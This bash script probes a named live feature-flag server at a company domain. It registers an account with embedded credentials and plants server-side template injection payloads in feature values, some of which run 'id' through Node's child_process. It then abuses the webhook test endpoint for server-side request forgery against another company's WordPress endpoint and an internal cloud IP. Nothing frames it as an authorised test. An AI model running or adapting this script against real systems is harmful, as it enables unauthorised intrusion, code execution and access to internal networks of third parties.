#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Register new account
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"email":"kw-v17-test@proton.me","password":"Hy7Nm3Qw9Rx!","first_name":"V","last_name":"17"}' --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"
[ -z "$KEY" ] && echo "Reg failed: $ACCT" && exit 1

# Setup
OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"name":"v17"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"e\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
echo "Setup: $OID/$PID/$EKEY"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
}

# Create feature with various SSTI payloads
echo "=== FEATURES ==="
for name_val in \
  "ssti_ejs|<%= require('child_process').execSync('id').toString() %>" \
  "ssti_nunjucks|{{ range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()')() }}" \
  "ssti_pug|#{7*7}" \
  "ssti_python|{{ ''.__class__.__mro__[1].__subclasses__() }}"; do
  name=$(echo "$name_val" | cut -d'|' -f1)
  val=$(echo "$name_val" | cut -d'|' -f2-)
  echo -n "$name -> "
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/${PID}/features/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"$name\",\"type\":\"FLAG\",\"default_enabled\":true,\"initial_value\":\"$val\"}" --max-time 10 | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('id',d.get('detail','FAIL')))" 2>/dev/null
done

# Get all flags to see if any were rendered
echo "=== GET FLAGS ==="
curl -s "https://flagsmith.koinworks.com/api/v1/flags/" \
  -H "X-Environment-Key: $EKEY" -H "User-Agent: $UA" --max-time 10 | python3 -c "
import json,sys
flags = json.load(sys.stdin)
for f in flags:
    feat = f.get('feature',{})
    print(f'{feat.get(\"name\",\"?\")}: {f.get(\"feature_state_value\",\"\")[:80]}')
" 2>/dev/null

# SSRF: Check koinp2p.com db-config readable via admin-ajax
echo "=== WP DB CONFIG ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=heartbeat"
echo ""

# SSRF: Test internal endpoints for any GCP service
echo "=== GCP INTERNAL ==="
SSRF "http://10.128.0.1:80/"
echo ""
